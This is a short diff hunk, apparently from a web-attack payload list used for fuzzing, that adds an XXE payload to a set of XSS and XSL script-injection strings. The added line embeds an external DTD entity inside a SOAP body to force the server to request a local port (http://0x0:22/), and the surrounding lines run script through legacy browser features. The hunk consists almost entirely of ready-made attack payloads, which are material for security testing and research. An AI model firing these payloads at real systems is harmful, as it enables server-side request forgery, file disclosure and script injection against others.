@@ -29,4 +29,5 @@
 <?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
 <?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
 <?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
 /* RFI END */
